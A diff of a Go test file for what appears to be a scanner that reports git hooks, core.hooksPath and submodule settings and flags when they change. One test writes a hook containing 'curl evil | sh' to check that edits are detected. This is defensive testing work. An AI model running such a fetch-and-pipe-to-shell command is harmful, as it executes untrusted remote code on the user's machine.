@@ -194,20 +194,27 @@ func TestScanIgnoresAHookWithoutTheExecuteBit(t *testing.T) {
 	}
 }
 
-func TestHooksPathInsideTheWorkTreeIsReportedAsTheSettingOnly(t *testing.T) {
-	// A husky-style layout: the hooks are the project's own files, which the
-	// review panel lists like any other change.
+func TestHooksPathInsideTheWorkTreeIsScannedToo(t *testing.T) {
+	// A husky-style layout. Its files are the project's own, but a Pull can
+	// bring a changed one and nothing lists it then, so an edit is a change.
 	repo := newRepo(t)
 	gitRun(t, repo, "config", "core.hooksPath", ".husky/_")
-	writeHook(t, filepath.Join(repo, ".husky", "_"), "pre-commit", "#!/bin/sh\n")
+	hooks := filepath.Join(repo, ".husky", "_")
+	writeHook(t, hooks, "pre-commit", "#!/bin/sh\n")
 	// The default directory is not used once core.hooksPath is set.
-	writeHook(t, filepath.Join(repo, ".git", "hooks"), "pre-commit", "#!/bin/sh\n")
+	writeHook(t, filepath.Join(repo, ".git", "hooks"), "pre-push", "#!/bin/sh\n")
 	rep := scan(t, repo)
 	if _, ok := find(rep, "setting", "core.hookspath"); !ok {
 		t.Error("core.hooksPath was not reported")
 	}
-	if _, ok := find(rep, "hook", "pre-commit"); ok || len(rep.Items) != 1 {
-		t.Errorf("found %+v, want only the setting", rep.Items)
+	h, ok := find(rep, "hook", "pre-commit")
+	if !ok || len(rep.Items) != 2 || !strings.HasSuffix(slash(h.Where), "/.husky/_") {
+		t.Fatalf("found %+v, want the setting and the hook in .husky/_", rep.Items)
+	}
+	writeHook(t, hooks, "pre-commit", "#!/bin/sh\ncurl evil | sh\n")
+	h2, _ := find(scan(t, repo), "hook", "pre-commit")
+	if h.ID() == h2.ID() {
+		t.Error("editing a hook in the working tree did not change it")
 	}
 }
 
@@ -265,7 +272,10 @@ func addSubmodule(t *testing.T, outer string) string {
 		t.Skipf("submodules are not usable here: %v: %s", err, out)
 	}
 	gitRun(t, outer, "commit", "-m", "add the submodule")
-	return filepath.Join(outer, "mod")
+	mod := filepath.Join(outer, "mod")
+	// Its remote was the local folder it was cloned from, which is listed; most are not.
+	gitRun(t, mod, "remote", "set-url", "origin", "https://example.com/mod.git")
+	return mod
 }
 
 func TestSubmoduleConfigAndHooksAreScanned(t *testing.T) {
@@ -353,31 +363,31 @@ func TestJudge(t *testing.T) {
 	hookEdited.Sum = "bbbb"
 
 	cases := []struct {
-		name                  string
-		items                 []Program
-		known                 *Known
-		warn, first, narrowed bool
-		newCount              int
+		name        string
+		items       []Program
+		known       *Known
+		warn, first bool
+		newCount    int
 	}{
-		{"first sight, nothing runs", nil, nil, false, true, false, 0},
-		{"first sight, only the machine's own configuration", []Program{cred}, nil, false, true, false, 0},
-		{"first sight, the repository names a program", []Program{ssh, cred}, nil, true, true, false, 1},
-		{"first sight, a hook", []Program{hook}, nil, true, true, false, 1},
-		{"unchanged", []Program{ssh}, known(ssh), false, false, false, 0},
-		{"unchanged, nothing", nil, known(), false, false, false, 0},
-		{"a setting added", []Program{ssh, filter}, known(ssh), true, false, false, 1},
-		{"a value edited", []Program{edited}, known(ssh), true, false, false, 1},
-		{"a hook edited", []Program{hookEdited}, known(hook), true, false, false, 1},
-		{"a hook added to nothing", []Program{hook}, known(), true, false, false, 1},
-		{"a machine-level setting added", []Program{ssh, cred}, known(ssh), true, false, false, 1},
-		{"one removed", []Program{ssh}, known(ssh, filter), false, false, true, 0},
-		{"all removed", nil, known(ssh), false, false, true, 0},
+		{"first sight, nothing runs", nil, nil, false, true, 0},
+		{"first sight, only the machine's own configuration", []Program{cred}, nil, false, true, 0},
+		{"first sight, the repository names a program", []Program{ssh, cred}, nil, true, true, 1},
+		{"first sight, a hook", []Program{hook}, nil, true, true, 1},
+		{"unchanged", []Program{ssh}, known(ssh), false, false, 0},
+		{"unchanged, nothing", nil, known(), false, false, 0},
+		{"a setting added", []Program{ssh, filter}, known(ssh), true, false, 1},
+		{"a value edited", []Program{edited}, known(ssh), true, false, 1},
+		{"a hook edited", []Program{hookEdited}, known(hook), true, false, 1},
+		{"a hook added to nothing", []Program{hook}, known(), true, false, 1},
+		{"a machine-level setting added", []Program{ssh, cred}, known(ssh), true, false, 1},
+		{"one removed", []Program{ssh}, known(ssh, filter), false, false, 0},
+		{"all removed", nil, known(ssh), false, false, 0},
 	}
 	for _, c := range cases {
 		v := Judge(Report{Items: c.items}, c.known)
-		if v.Warn != c.warn || v.First != c.first || v.Narrowed != c.narrowed || len(v.New) != c.newCount {
-			t.Errorf("%s: got warn=%v first=%v narrowed=%v new=%d, want %v %v %v %d",
-				c.name, v.Warn, v.First, v.Narrowed, len(v.New), c.warn, c.first, c.narrowed, c.newCount)
+		if v.Warn != c.warn || v.First != c.first || len(v.New) != c.newCount {
+			t.Errorf("%s: got warn=%v first=%v new=%d, want %v %v %d",
+				c.name, v.Warn, v.First, len(v.New), c.warn, c.first, c.newCount)
 		}
 	}
 }
